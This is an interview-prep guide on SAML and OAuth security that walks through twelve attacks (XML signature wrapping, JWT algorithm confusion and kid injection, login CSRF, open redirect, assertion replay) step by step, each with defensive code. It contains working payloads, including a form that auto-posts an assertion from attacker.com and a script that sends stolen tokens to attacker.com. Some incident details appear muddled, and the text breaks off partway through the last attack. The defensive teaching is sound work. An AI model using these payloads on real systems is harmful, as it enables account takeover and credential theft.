# IAM Interview Prep — Document 2 of 4
## Attack Scenarios + Live Incident War Rooms

> **Series:** Principal Engineer · IAM Product Development · SAML + OIDC + OAuth 2.0

---

## 🌉 Bridge from Document 1

**What Document 1 gave you:** Protocol depth. You understand SAML, OIDC, and OAuth 2.0 at the level of design decisions — why PKCE exists, what refresh token rotation actually detects, how to architect a multi-tenant SSO platform for 500 enterprise customers.

**What Document 1 didn't cover:** What happens when someone tries to break those systems. And what happens when they break on their own at 3am.

**This document covers:**
- **Category 3** — 12 attack scenarios. You are the attacker. Walk through every exploit step by step. Then defend it.
- **Category 4** — 12 live incident war rooms. PagerDuty fired. System is down. Here is your diagnostic tree.

> 💬 *"The best security engineers I know think like attackers during design, not during incident response. If you understand exactly how the attack works, the defence is obvious. If you only know the defence rule, you will miss the variants."*

---

## Category 3 — Attack Scenarios 🔴

> *"You are the attacker. Walk me through it."*

**What this category tests:** Can you think like an adversary? Do you understand the specific flaw each attack exploits — not just that it exists? Can you explain the attack to a developer in a way that makes the fix feel inevitable rather than arbitrary?

**Format for every attack:**
1. The scenario — a real situation where this attack is plausible
2. You are the attacker — exact steps
3. Why it works — the specific flaw being exploited
4. Real-world victims — named incidents where this happened
5. The prevention — what stops it and why

---

### Attack 1 — XML Signature Wrapping (XSW): the crown jewel of SAML attacks

**The scenario:** It is Tuesday morning. A security researcher emails your company. Subject line: *"Critical: authentication bypass in your SAML integration."* They have a proof-of-concept. They authenticated as `admin@yourcompany.com` without knowing the admin's password. They used their own legitimate account to do it. Here is exactly what they did.

**❓ "You have a valid SAML assertion from your own legitimate login. Walk me through how you log in as the administrator."**

**💬 What most people say:** "XSW is when you wrap a fake assertion around a real one." This is correct but describes the result, not the mechanism. An interviewer will press: "Show me the XML."

**⭐ You are the attacker — step by step:**

```
Setup:
  Your legitimate credentials: jane@company.com / your_real_password
  Target: admin@company.com session at the SP
  Tool: SAML-tracer browser extension (free, takes 2 minutes to install)

Step 1: Log in legitimately
  You log in as jane@company.com via normal SAML SSO.
  SAML-tracer captures the SAMLResponse. You Base64-decode it.
  You now have the raw XML with a valid signature.

Step 2: Study the structure
  <saml:Assertion ID="_real_assert_abc123">
    <saml:NameID>jane@company.com</saml:NameID>
    <saml:Attribute Name="Role">
      <saml:AttributeValue>Employee</saml:AttributeValue>
    </saml:Attribute>
    <ds:Signature>
      <Reference URI="#_real_assert_abc123"/>
      <!-- signature covers the element with ID="_real_assert_abc123" -->
    </ds:Signature>
  </saml:Assertion>

Step 3: Construct the wrapped XML
  <saml:Assertion ID="_evil_outer">
    <!-- NO SIGNATURE on this element — you can write anything you want -->
    <saml:NameID>admin@company.com</saml:NameID>
    <saml:Attribute Name="Role">
      <saml:AttributeValue>Administrator</saml:AttributeValue>
    </saml:Attribute>

    <!-- Nested inside: your real, validly-signed assertion -->
    <saml:Assertion ID="_real_assert_abc123">
      <saml:NameID>jane@company.com</saml:NameID>
      <ds:Signature>
        <Reference URI="#_real_assert_abc123"/>
        <!-- This signature is still valid — it covers this nested element exactly -->
      </ds:Signature>
    </saml:Assertion>

  </saml:Assertion>

Step 4: Re-encode and POST
  Base64-encode the modified XML.
  POST it to the SP's ACS URL as the SAMLResponse value.
  Browser doesn't care — it's just sending form data.

Step 5: Watch the vulnerable SP process it
  SP calls verifySignature(document) → finds _real_assert_abc123 → VALID ✓
  SP calls getAssertion(document) → finds FIRST Assertion by XPath position
                                 → returns _evil_outer
  SP reads NameID from _evil_outer: admin@company.com
  SP creates session for admin@company.com
  You are in as the administrator. With zero knowledge of the admin password.
```

**Why it works — the specific flaw:**

```
The SP validated the right element (the signature on _real_assert_abc123).
The SP processed the wrong element (the first Assertion child by position).

"Signature valid" ≠ "the element I'm processing is the one that was signed."
These are two different questions and most naive implementations only ask the first.
```

**🏭 Real-world victims:**

```
GitHub Enterprise SAML (2017):
  Security researcher demonstrated XSW against GitHub's Enterprise SAML integration.
  Any user with a valid assertion could authenticate as ANY organisation member,
  including organisation owners and administrators.
  GitHub patched within 72 hours. The technique was demonstrated publicly at a conference.

OneLogin (multiple reports):
  XSW vulnerabilities discovered in OneLogin's SAML processing libraries.
  Enterprise customers using OneLogin for SAML SSO were potentially affected.

Duo Security Research (2018):
  Duo's team demonstrated XSW against dozens of enterprise SAML implementations
  in a research paper. The vulnerability was widespread and largely unpatched.
```

**The prevention — three layers:**

```
Layer 1: Use a vetted SAML library (non-negotiable)
  python3-saml, java-saml, passport-saml, ruby-saml, OneLogin SDKs.
  NEVER use a generic XML parsing library (minidom, lxml, Nokogiri) with
  hand-rolled signature validation. This is where XSW lives.

Layer 2: Process by Reference URI, NOT by position
  WRONG:
    const assertion = doc.getElementsByTagNameNS(SAML_NS, 'Assertion')[0];
    // Gets the FIRST Assertion in the document — attacker controls this

  CORRECT:
    const sigRef = doc.querySelector('Signature Reference').getAttribute('URI');
    const assertionId = sigRef.slice(1); // remove leading '#'
    const assertion = doc.getElementById(assertionId);
    if (!assertion) throw new SecurityError('Signed element not found — reject');
    // Gets the SPECIFIC element the signature covers — attacker cannot substitute this

Layer 3: Schema-validate before any processing
  Validate the XML against the SAML 2.0 schema BEFORE signature verification.
  Structurally anomalous XML (nested assertions, unexpected elements) is rejected
  before any processing logic runs.
```

> 🎯 **What the interviewer is really testing:** Can you explain a complex XML attack at the code level? Can you connect "the rule" (use a vetted library) to "the mechanism" (Reference URI vs position-based lookup)? A Principal who cannot explain XSW at this level should not be reviewing SAML implementations.

---

### Attack 2 — Algorithm confusion: forging JWTs with the public key

**The scenario:** Your Auth Server uses RS256. You publish the public key at your JWKS endpoint — as you should, it's designed to be public. A security researcher points out that your JWT validation library, configured incorrectly, will accept tokens signed with your own public key as the HMAC secret. This is CVE-2015-9235. It affected multiple major JWT libraries simultaneously.

**❓ "Describe the JWT algorithm confusion attack. Write the exact token header the attacker crafts and explain why a naive implementation accepts it."**

**⭐ You are the attacker — step by step:**

```
What you know:
  The Auth Server signs JWTs with RS256 (RSA private key).
  The RS256 public key is at: https://auth.example.com/.well-known/jwks.json
  This is public — anyone can fetch it. That is by design.

Step 1: Fetch the public key
  GET https://auth.example.com/.well-known/jwks.json
  You receive the RSA public key. It is just bytes — a sequence of numbers.

Step 2: Forge a token
  Craft your JWT header: { "alg": "HS256" }
  (You changed RS256 to HS256 — symmetric HMAC, not asymmetric RSA)

  Craft your desired payload:
  { "sub": "admin", "iss": "https://auth.example.com", "scope": "admin.all" }

  Sign this JWT using HS256 with the PUBLIC KEY AS THE HMAC SECRET.
  (HS256 just needs bytes as the secret — the public key is bytes — this works)

Step 3: Submit to the vulnerable API
  Authorization: Bearer <your forged token>

Step 4: The naive implementation accepts it
  Library code (pseudocode for the vulnerable pattern):
    const alg = jwt.header.alg;  // "HS256" — attacker controls this!
    const key = alg === 'RS256' ? getPublicKey() : getHmacSecret();
    // With alg=HS256, library fetches the HS256 secret
    // If no HS256 secret configured, some libraries FALL BACK TO THE PUBLIC KEY
    jwt.verify(token, key);  // HS256(payload, public_key) == your signature ✓
    // Token accepted. You are now "admin" with scope "admin.all".
```

**Why it works — the specific flaw:**

```
The JWT header's "alg" field is attacker-controlled input.
A naive validator trusts it to decide which algorithm to use for verification.
An attacker who can choose HS256 and sign with the public key as the HMAC secret
has bypassed signature verification entirely — using the public key against itself.
```

**🏭 Real-world victims:**

```
CVE-2015-9235 — auth0/node-jsonwebtoken:
  Auth0's own JWT library for Node.js accepted alg:none by default.
  Any JWT with the signature stripped and alg set to "none" was accepted as valid.
  Libraries affected: node-jsonwebtoken, python-jwt, php-jwt, and dozens more.
  Impact: any application using these libraries could have tokens forged.

  Auth0 patched their library. The CVE was assigned.
  The vulnerability was discovered by Tim McLean at the University of Waterloo.

CVE-2022-21449 — "Psychic Signatures" (Java 15-17):
  A different but related attack: Java's ECDSA implementation accepted blank (all-zero)
  signatures as valid for any message and any key.
  Any JWT signed with a blank ES256 signature was accepted as valid by Java applications.
  Impact: any Java application using ECDSA JWT validation was vulnerable.
  Oracle patched in April 2022.
```

**The prevention — one line:**

```javascript
// WRONG — alg is read from the token header (attacker-controlled):
jwt.verify(token, key);

// CORRECT — explicit algorithm allowlist:
const { payload } = await jwtVerify(token, JWKS, {
  algorithms: ['RS256', 'ES256']
  // HS256 is not in this list → rejected regardless of header
  // alg:none is not in this list → rejected
  // The header's alg claim is ADVISORY — your allowlist is AUTHORITATIVE
});
```

> 💬 *"The lesson from CVE-2015-9235 is that the JWT header is attacker-controlled input. Never let attacker-controlled input determine how you validate the attacker's own data. Always set an explicit algorithm allowlist. Never trust defaults."*

---

### Attack 3 — Login CSRF: logging someone into your account

**The scenario:** You are testing a competitor's web app that uses OAuth 2.0. You notice something while inspecting the callback URL in your browser: `https://app.example.com/callback?code=abc123&state=randomstate`. The `state` parameter is always the literal string `randomstate`. Every single OAuth flow. You now have enough to log any user who visits a link you control into YOUR account — where they will then enter their payment details, health records, or whatever sensitive data the app collects.

**❓ "The state parameter is a static string. Describe the attack and the exact impact."**

**⭐ You are the attacker — step by step:**

```
Goal: trick the victim into completing an OAuth flow that logs THEM
      into YOUR account. They then enter their sensitive data into your account.

Step 1: Start an OAuth flow for YOUR account — but don't complete it
  GET https://app.example.com/login
  → App redirects to Auth Server with state=randomstate
  → Auth Server redirects back: /callback?code=YOUR_AUTH_CODE&state=randomstate
  → Stop here. Don't complete the callback yet.

Step 2: Craft your trap
  Create a web page, email, or img tag that makes the victim's browser visit:
  https://app.example.com/callback?code=YOUR_AUTH_CODE&state=randomstate

  As simple as:
  <img src="https://app.example.com/callback?code=YOUR_AUTH_CODE&state=randomstate">
  One HTML tag. That is the entire attack.

Step 3: Victim visits the trap
  Their browser GETs the callback URL.
  The app: state=randomstate matches stored state=randomstate ✓ (always matches)
  The app exchanges YOUR auth code for YOUR tokens.
  The app creates a session bound to YOUR account.
  The victim is now logged in as you.

Step 4: Harvest
  Victim navigates to their profile page — they see your profile.
  They think there is a bug, but the app looks real.
  They enter their credit card to "set up their account."
  The card goes into YOUR account.
  You now have their payment method, address, and any data they entered.
```

**Why it works — the specific flaw:**

```
The state parameter exists specifically to prevent this attack.
It should be: a cryptographically random value, generated per authorization request,
              stored in the user's session, and validated against the returned value on callback.

With state=randomstate:
  The random value is identical for every user and every session.
  The CSRF check is a no-op — it always passes.
  The protection is completely defeated.
```

**The prevention:**

```javascript
// Before redirecting to Auth Server:
const state = crypto.randomUUID(); // "3f2a8b1c-4d5e-6f7a-8b9c-0d1e2f3a4b5c"
sessionStorage.setItem('oauth_state', state);

// Auth Server redirect includes this state value.

// On callback:
const returnedState = new URLSearchParams(location.search).get('state');
const storedState   = sessionStorage.getItem('oauth_state');

if (!returnedState || returnedState !== storedState) {
  // States don't match = someone else initiated this flow
  throw new Error('CSRF detected — aborting login');
}
sessionStorage.removeItem('oauth_state'); // single-use — delete after check
```

> 🎯 **What the interviewer is really testing:** Do you understand CSRF in the OAuth context specifically? Many developers know about form CSRF but don't connect it to OAuth state. This question tests whether you understand the state parameter as a CSRF token, not just as a "context-passing mechanism."

---

### Attack 4 — Open redirect post-SSO authentication

**The scenario:** You are doing a penetration test on a company's SAML implementation. Their login flow works correctly. Signatures are valid. InResponseTo is validated. Assertions are not replayable. The implementation looks solid. Then you notice the SP's code that handles the post-login redirect:

```python
relay_state = request.form.get('RelayState', '/dashboard')
return redirect(relay_state)  # after successful authentication
```

One line. No validation. This company's users can now be phished using the company's own authentication system.

**❓ "Show me the attack and the exact user experience that makes it dangerous."**

**⭐ You are the attacker — step by step:**

```
Step 1: Craft the malicious link
  https://yourcompany.com/saml/login?RelayState=https://evil.com/harvest

Step 2: Send it to the victim
  "Please review the attached contract before our call tomorrow."
  "Your expense report requires approval: [link]"
  Any pretext that makes clicking a company link seem natural.

Step 3: Victim clicks the link
  Victim sees: their company's legitimate PingFederate login page.
  Everything looks correct — the URL, the logo, the MFA prompt.
  Victim enters their real corporate credentials.
  PingFed authenticates them successfully.
  SAML assertion issued. Signature valid. Session created.

Step 4: The redirect
  The SP redirects to RelayState: https://evil.com/harvest
  Victim lands on evil.com — which looks exactly like an internal portal.
  "Your session expired during the login process. Please re-enter your password."
  Victim enters their password again → stolen.

Why this works:
  The authentication was REAL. The user correctly authenticated.
  The phishing happens AFTER a legitimate login, not instead of one.
  Users are most relaxed about security right after a successful login.
  The domain in the browser bar was legitimate during the entire auth flow.
```

**The prevention:**

```python
from urllib.parse import urlparse

def safe_redirect(relay_state: str, base_origin: str = 'https://yourapp.com') -> str:
    if not relay_state:
        return '/dashboard'
    try:
        parsed = urlparse(relay_state)
        # Allow relative paths (no scheme/host = same origin)
        if not parsed.scheme and not parsed.netloc:
            return relay_state
        # Allow same-origin absolute URLs
        if f"{parsed.scheme}://{parsed.netloc}" == base_origin:
            return relay_state
        # Everything else: reject and send to safe default
        return '/dashboard'
    except Exception:
        return '/dashboard'

# In the ACS handler:
safe_url = safe_redirect(request.form.get('RelayState', ''))
return redirect(safe_url)
```

> 💬 *"Open redirect post-SSO is particularly effective because the victim's guard is lowest immediately after a successful authentication. They just proved they are who they say they are. They feel secure. That is exactly when the redirect lands. Validate RelayState. Always."*

---

### Attack 5 — Assertion replay: using a valid assertion twice

**The scenario:** You are a developer at a company that uses SAML SSO. You notice that the SaaS app your company uses has a 5-minute assertion validity window. You wonder: if I intercept a valid assertion, can I use it twice before it expires? You set up a MITM proxy during your colleague's login. You capture their assertion at T+1 minute. You have 4 minutes. Let's see what you can do.

**❓ "Describe exactly how assertion replay works and how the SP should prevent it."**

**⭐ You are the attacker — step by step:**

```
Setup: you have intercepted a valid SAMLResponse at T+1 minute after issue
       The assertion's NotOnOrAfter is at T+5 minutes. You have 4 minutes.

Step 1: Decode the captured SAMLResponse (already done by your proxy)
Step 2: POST it directly to the SP's ACS URL before NotOnOrAfter expires

  curl -X POST https://sp.example.com/saml/acs \
    -d "SAMLResponse=BASE64_OF_CAPTURED_ASSERTION" \
    -d "RelayState=whatever"

Step 3: SP validates:
  Signature: valid ✓ (you didn't modify anything)
  Issuer: correct ✓
  AudienceRestriction: correct ✓
  NotOnOrAfter: T+5 minutes, current time T+3 — still valid ✓
  InResponseTo: if IdP-initiated flow, there may be none to check

Step 4: SP creates a session for the victim without them knowing.
        You are now authenticated as the victim in the SP.
        You have until the SP's session expires.
```

**The specific flaw:**

```
The SP validates the ASSERTION but not whether THIS assertion has been used before.
A valid assertion is valid for its entire time window — multiple times.
Nothing in the XML or the signature prevents a second use.
The SP needs an external memory to know "I've seen this assertion before."
```

**The prevention:**

```python
import redis
from datetime import datetime

async def process_assertion(assertion):
    assertion_id    = assertion.get_attribute('ID')      # e.g. "_assert_abc123"
    not_on_or_after = assertion.get_condition('NotOnOrAfter')  # datetime

    # Check if this exact assertion ID was already processed
    cache_key = f"saml:seen:{assertion_id}"
    if await redis_client.exists(cache_key):
        # This assertion was already processed — replay attack
        raise SecurityError(f"Assertion replay detected: {assertion_id}")

    # Mark as seen with TTL = remaining validity window + 60s buffer
    remaining_seconds = (not_on_or_after - datetime.utcnow()).seconds + 60
    await redis_client.setex(cache_key, remaining_seconds, "1")

    # Continue with normal assertion processing...

# Why this works:
#   First use: ID not in Redis → process → store with TTL
#   Replay attempt: ID found in Redis → reject
#   After TTL expires: ID removed, but assertion also expired (NotOnOrAfter passed)
#   No false positives. No unbounded memory growth.
```

**Additional hardening:** Shorten `NotOnOrAfter` from 5 minutes to 2 minutes in your IdP configuration. Smaller window = smaller replay opportunity, even with no cache.

---

### Attack 6 — Token leakage via Referer header (the Implicit flow disaster)

**The scenario:** It is 2012. Facebook uses the OAuth Implicit flow for third-party app integrations. Access tokens appear in URL fragments. A user visits a Facebook app. The app loads a third-party analytics script. The browser sends a Referer header to the analytics provider containing the Facebook access token in the URL fragment. Millions of active tokens are exfiltrated to advertising networks. This is a real incident. Here is the complete attack surface for tokens in URLs.

**❓ "A developer places the access token in the URL: GET /api/resource?access_token=eyJh... List every place this token can leak."**

**⭐ The complete leakage surface:**

```
1. Browser history
   Every URL you visit is saved in browser history.
   Anyone with physical access to the device — a family member, a repair shop,
   a stolen laptop — can open Chrome's history and see the full URL with token.
   The history file on disk is accessible to any process running as the user.

2. Server access logs (the one nobody thinks of)
   NGINX: 203.0.113.42 - - [18/Apr/2024] "GET /api/resource?access_token=eyJh..." 200
   That token is now in your NGINX log.
   And your CDN log. And your WAF log. And your API gateway log.
   And your SIEM. And your log archiver. And your cold storage.
   Every engineer with log access has this token.
   These logs are retained for years.

3. Referrer header (the Facebook incident)
   Your page loads a Google Analytics script, an advertising pixel, a support widget.
   The browser sends: Referer: https://yourapp.com/api/resource?access_token=eyJh...
   Every third-party resource on your page receives this header.
   Google, Meta, Hotjar, Intercom — all get the token.

4. Proxy and firewall logs
   Corporate proxies. DLP systems. WAFs. Network monitoring tools.
   All log URLs. All log the access token.
   Your SOC team and every security vendor you use can see it.

5. Browser extensions
   A malicious or compromised browser extension that reads tab URLs
   has your token on every page load. One compromised npm package in an extension
   can silently exfiltrate every token it sees.

6. Shared links
   User copies "the URL to this report" to share with a colleague.
   The access token travels with it. Now two people have the same active token.
   No way to know who has it or where it goes next.

Business impact at a financial institution:
   scope=account.read: attacker reads all transaction history
   scope=transfer.write: attacker initiates transfers
   JWT valid for 1 hour. Cannot be revoked before expiry without a blocklist.
   GDPR breach notification required if customer financial data was exposed.
```

**The fix:**

```
Always use the Authorization header:
  GET /api/resource
  Authorization: Bearer eyJh...

Headers are NOT logged by default in web servers.
Headers are NOT stored in browser history.
Headers are NOT sent in Referer.
Headers are NOT visible in browser extensions that read tab URLs.

OAuth 2.1 explicitly prohibits tokens in URL query strings.
If you are doing it, stop now.
```

---

### Attack 7 — PKCE downgrade: stripping the protection mid-flight

**The scenario:** Your mobile app correctly implements PKCE. Your Auth Server supports PKCE but makes it optional for backwards compatibility. An attacker who can perform a MITM on the authorization request (corporate proxy, rogue WiFi, malicious app on the same device) strips the `code_challenge` parameter before it reaches the Auth Server. The code is issued without PKCE binding. The attacker steals the code. They exchange it without providing a verifier. Tokens issued.

**❓ "How does the PKCE downgrade attack work and how do you prevent it at the Auth Server level?"**

**⭐ You are the attacker — step by step:**

```
Step 1: Intercept the authorization request
  Original: GET /authorize?...&code_challenge=S256_HASH&code_challenge_method=S256

Step 2: Strip PKCE parameters
  Modified: GET /authorize?...
  (code_challenge and code_challenge_method removed)

Step 3: Auth Server processes the modified request
  No code_challenge in the request → Auth Server notes: "no PKCE for this code"
  Issues auth_code without binding it to any verifier

Step 4: Steal the auth code from the redirect
  (Open redirect, malicious redirect URI, log exposure — various methods)

Step 5: Exchange without verifier
  POST /token
  code=STOLEN_CODE
  client_id=app-id
  redirect_uri=...
  (No code_verifier — none was registered because PKCE was stripped)

Step 6: Auth Server issues tokens
  No verifier was registered for this code → no verifier check required → tokens issued
  Attacker has full token access.
```

**The prevention — Auth Server must enforce, not just support:**

```
// Auth Server pseudocode — the critical enforcement point:
function processAuthorizationRequest(request) {
  const client = getClient(request.client_id);

  // OAuth 2.1: PKCE is MANDATORY for all Authorization Code clients
  if (!request.code_challenge) {
    return error('invalid_request',
      'code_challenge is required for Authorization Code flow');
  }
  if (!['S256'].includes(request.code_challenge_method)) {
    return error('invalid_request',
      'code_challenge_method must be S256');
  }
  // NEVER allow plain code_challenge_method — SHA256 only
}

// On token exchange:
function processTokenRequest(request) {
  const code = getStoredCode(request.code);
  if (code.pkce_challenge) {
    // PKCE was used for this code — verifier MUST be provided
    if (!request.code_verifier) {
      return error('invalid_grant', 'code_verifier is required');
    }
    const computed = base64url(sha256(request.code_verifier));
    if (computed !== code.pkce_challenge) {
      return error('invalid_grant', 'code_verifier does not match challenge');
    }
  }
  // If no pkce_challenge stored for this code — only valid if your server
  // doesn't allow PKCE-less codes (it shouldn't).
}
```

---

### Attack 8 — IdP-initiated Login CSRF: logging victims into your account

**The scenario:** Your platform supports IdP-initiated SAML SSO — users can click tiles in their company portal and land directly in your app without a prior redirect. A red team researcher discovers that your ACS handler processes any valid assertion without validating that your app ever requested it. They can trick a victim into authenticating as the attacker's account.

**❓ "Explain the Login CSRF attack via IdP-initiated SAML. Why is it harder to prevent than SP-initiated CSRF?"**

**⭐ You are the attacker — step by step:**

```
Setup: You have a legitimate account on the platform (attacker@company.com).

Step 1: Obtain a valid SAMLResponse for YOUR account
  Initiate an IdP-initiated SSO flow through your company's portal.
  Capture the SAMLResponse via SAML-tracer BEFORE it gets submitted.

Step 2: Create a trap page
  <form method="POST" action="https://sp.yourcompany.com/saml/acs" id="csrf_form">
    <input type="hidden" name="SAMLResponse" value="YOUR_VALID_BASE64_ASSERTION">
    <input type="hidden" name="RelayState" value="">
  </form>
  <script>document.getElementById('csrf_form').submit();</script>

Step 3: Trick the victim into visiting your trap page
  "Click this link to see the report": https://attacker.com/trap.html
  Victim's browser auto-submits your assertion to the SP's ACS URL.

Step 4: SP processes the assertion
  Signature: valid ✓ (it's a real assertion for attacker@company.com)
  Time window: valid ✓
  InResponseTo: none — it's IdP-initiated, nothing to check
  SP creates a session for attacker@company.com on the victim's browser.

Step 5: Victim is logged in as you
  Victim thinks they are in their account.
  They enter their credit card, update their health data, approve a financial transaction.
  All in YOUR account.
```

**Why harder than SP-initiated:**

```
SP-initiated CSRF protection:
  SP generates a random AuthnRequest ID.
  Stores it in the user's session.
  Validates InResponseTo matches on callback.
  Attacker cannot produce a valid InResponseTo without compromising the SP's session store.

IdP-initiated has no InResponseTo:
  There was no AuthnRequest. No stored ID to validate against.
  The SP has no prior request to bind the assertion to.
  Any valid assertion can be submitted by any browser at any time.
```

**Mitigations:**

```
Option 1: CSRF token in RelayState (best for when IdP-initiated is required)
  SP generates a CSRF token before the user visits the portal.
  Stores it in the user's session.
  Requires the IdP to embed it in the RelayState and return it.
  SP validates CSRF token on ACS receipt.
  Attacker cannot know the victim's CSRF token.

Option 2: Disable IdP-initiated entirely (most secure)
  Force all SSO through SP-initiated.
  All assertions must have InResponseTo matching a stored request.
  Breaks portal-tile UX but eliminates the entire attack class.
  Increasingly common in security-conscious implementations.

Option 3: IP allowlist for IdP-initiated
  Only accept IdP-initiated assertions from the IdP's known IP range.
  Attacker's browser submits from a random IP — not the IdP's IP.
  Defense in depth — combine with Option 1.

Recommendation: Option 2 for high-security SPs (finance, healthcare).
                Option 1 + 3 for standard enterprise SaaS.
```

---

### Attack 9 — Scope escalation: the confused deputy

**The scenario:** Your microservices platform has two services: `user-service` (issues tokens with `scope=profile.read`) and `admin-service` (requires `scope=admin.write`). Your colleague assures you: "The admin endpoints are protected. Only tokens with admin scope can use them." You ask to see the validation code. It checks the signature and expiry — but not the audience or scope. You know what to do.

**❓ "Service A issues tokens with scope=read. Service B requires scope=admin. Attacker submits a read-scoped token to an admin endpoint. Walk me through what happens and who is responsible for stopping it."**

**⭐ The attack:**

```
Setup:
  Your user-service token:
  {
    "sub": "user_123",
    "aud": "https://user-service.example.com",
    "scope": "profile.read",
    "exp": valid
  }
  Signed with the shared Auth Server key.

Step 1: Submit your user-service token to the admin endpoint
  GET https://admin-service.example.com/admin/export-all-users
  Authorization: Bearer YOUR_USER_TOKEN

Step 2: Vulnerable admin-service validator:
  signature: valid ✓ (same Auth Server signed it)
  exp: not expired ✓
  ... that's all it checks

Step 3: Admin endpoint executes
  You export all users. Full data. No admin credentials needed.
  You had a perfectly legitimate read-scoped token for a different service.
```

**The responsibility chain:**

```
Service A (user-service, the issuer): NOT responsible.
  The token was issued correctly — scope=profile.read, aud=user-service.
  Service A cannot control how other services misuse tokens it issued.

Service B (admin-service, the validator): FULLY responsible.
  Must validate: aud matches "https://admin-service.example.com"
  Must validate: scope includes "admin.write"
  Skipping either check is a security bug in Service B, not Service A.

The Auth Server: not directly responsible for post-issuance misuse.
  BUT: the Auth Server should only issue tokens for registered audience values.
  An admin-service token should only be issuable by a registered admin client.
  This adds a second layer of defence.
```

**The correct validation:**

```javascript
const { payload } = await jwtVerify(token, JWKS, {
  issuer:     'https://auth.example.com',
  audience:   'https://admin-service.example.com',  // ← rejects user-service tokens
  algorithms: ['RS256', 'ES256']
});

// scope check is NOT done by the library — you must do it manually:
const requiredScope = 'admin.write';
if (!payload.scope?.split(' ').includes(requiredScope)) {
  return res.status(403).json({
    error: 'insufficient_scope',
    error_description: `Required scope: ${requiredScope}`
  });
}
```

---

### Attack 10 — JWT kid injection: pointing the validator at your key

**The scenario:** Your JWT validator is configured to fetch the signing key dynamically based on the `kid` header in the incoming JWT. This is standard — the `kid` tells the validator which key to look up. But your validator fetches the key from a URL derived from the `kid` value itself, not from a pinned JWKS endpoint. An attacker who can set the `kid` can point your validator at a key they control.

**❓ "Describe the kid injection attack. What are the variants and what is the exact prevention?"**

**⭐ The attack variants:**

```
Variant 1: Direct URL injection
  Token header: { "alg": "RS256", "kid": "https://attacker.com/malicious-jwks.json" }
  Vulnerable validator: const key = await fetchKey(token.header.kid);
  If kid is treated as a URL → fetches attacker's public key
  Attacker signs with matching private key → validator accepts

Variant 2: SQL injection via kid
  Token header: { "alg": "HS256", "kid": "' OR '1'='1" }
  Vulnerable code: SELECT key FROM signing_keys WHERE id = '{kid}'
  SQL injection → returns an attacker-known key value → forge tokens

Variant 3: Path traversal via kid
  Token header: { "kid": "../../etc/passwd" }
  Vulnerable code: const key = fs.readFileSync(`/keys/${token.header.kid}`);
  Path traversal → reads arbitrary files → may return readable secrets

Variant 4: SSRF via kid
  Token header: { "kid": "http://internal-metadata.service/latest/secret-key" }
  Vulnerable validator fetches internal endpoints via the kid value
  Can be used to steal AWS instance metadata credentials, internal tokens, etc.
```

**The prevention — two rules that eliminate all variants:**

```javascript
// Rule 1: NEVER fetch keys from a URL derived from the token header.
//         Fetch from a PINNED, pre-configured JWKS URL only.

// WRONG:
const key = await fetchFromUrl(token.header.kid);  // attacker controls this

// CORRECT:
const PINNED_JWKS_URL = 'https://auth.example.com/.well-known/jwks.json';
// kid is used only to SELECT FROM the response of the pinned URL:
const jwks = await fetch(PINNED_JWKS_URL);
const key  = jwks.keys.find(k => k.kid === token.header.kid);
if (!key) throw new Error('Unknown kid — reject token');

// Rule 2: Validate kid against an allowlist of expected key IDs
const VALID_KEY_IDS = new Set(['key-2024-01', 'key-2024-04']);
if (!VALID_KEY_IDS.has(token.header.kid)) {
  throw new Error(`Invalid kid: ${token.header.kid}`);
}
```

---

### Attack 11 — SAML signature exclusion: removing the inner signature

**The scenario:** Your SAML SP validates that the outer SAMLResponse is signed. But it doesn't explicitly check whether the inner Assertion element is signed. An attacker who captures a valid SAMLResponse can strip the Assertion's signature, modify the assertion content, and resubmit. The outer Response signature still validates. The inner Assertion has been quietly altered.

**❓ "Show the attack and the exact code that prevents it."**

**⭐ The attack:**

```
Original valid SAMLResponse (structure):
  <samlp:Response>                     ← signed
    <saml:Assertion ID="_abc">         ← also signed separately
      <saml:NameID>jane@company.com</saml:NameID>
      <saml:AttributeValue>Employee</saml:AttributeValue>
      <ds:Signature>...</ds:Signature>  ← assertion-level signature
    </saml:Assertion>
    <ds:Signature>...</ds:Signature>    ← response-level signature
  </samlp:Response>

Attacker's modified SAMLResponse:
  <samlp:Response>                     ← response signature still valid
    <saml:Assertion ID="_abc">         ← MODIFIED CONTENT, signature REMOVED
      <saml:NameID>admin@company.com</saml:NameID>  ← changed!
      <saml:AttributeValue>Administrator</saml:AttributeValue>  ← changed!
      <!-- ds:Signature element deleted entirely -->
    </saml:Assertion>
    <ds:Signature>...</ds:Signature>    ← response signature still valid
  </samlp:Response>

SP validates response signature: VALID (response wasn't modified)
SP processes assertion: admin@company.com, Administrator role
SP creates admin session for attacker.
```

**The prevention:**

```javascript
function processAssertion(doc) {
  // Step 1: Find all Signature elements in the document
  const signatures = doc.querySelectorAll('Signature');

  // Step 2: Find which element each signature covers
  const signedIds = new Set(
    Array.from(signatures).map(sig =>
      sig.querySelector('Reference').getAttribute('URI').slice(1)
    )
  );

  // Step 3: Find the Assertion element
  const assertion = doc.getElementById(assertionId);

  // Step 4: REQUIRE that the Assertion itself is signed
  if (!signedIds.has(assertion.getAttribute('ID'))) {
    throw new SecurityError(
      'Assertion is not signed. Both Response and Assertion must be signed.'
    );
  }

  // Step 5: Validate the assertion signature
  validateSignatureForElement(assertion, idpCertificate);
}
```

In your SP metadata, declare: `WantAssertionsSigned="true"` — this tells the IdP that your SP will reject unsigned assertions. Belt and braces.

---

### Attack 12 — XSS token theft chain: from injection to account takeover

**The scenario:** Your SPA stores refresh tokens in `localStorage`. A developer on your marketing team adds a third-party chat widget to the page without a security review. The widget vendor is later compromised. Attackers inject malicious JavaScript into the widget script that runs on every page of your SPA. Here is the full attack chain from that injection to persistent account takeover for every active user.

**❓ "Your SPA stores refresh tokens in localStorage. Describe the complete attack chain from XSS injection to persistent account takeover."**

**⭐ The complete attack chain:**

```
Day 1: Attacker compromises the chat widget vendor's CDN
  Malicious code added to: https://chat-widget.io/v2/widget.js

  The injected code:
  (function steal() {
    const rt = localStorage.getItem('refresh_token');
    const at = localStorage.getItem('access_token');
    if (!rt && !at) return;
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify({ rt, at, origin: location.origin, ua: navigator.userAgent }),
      mode: 'no-cors'
    });
    // no-cors: browser won't block even without CORS headers on attacker server
  })();

Day 1: Every user who opens your SPA runs the attacker's code
  One function call. Sub-100ms. User sees nothing.
  30,000 users visit your SPA that day.
  Attacker receives 30,000 refresh tokens.

Day 2: Attacker processes the tokens
  For each refresh token:
    POST /token?grant_type=refresh_token&refresh_token=STOLEN
    → receives access_token + new_refresh_token

  Without rotation: same refresh token works indefinitely
  With rotation: attacker uses the token once, gets a new one,
                 stores the new one, and uses that
                 The legitimate user is silently logged out when
                 THEY try to refresh (the old token is now invalid)

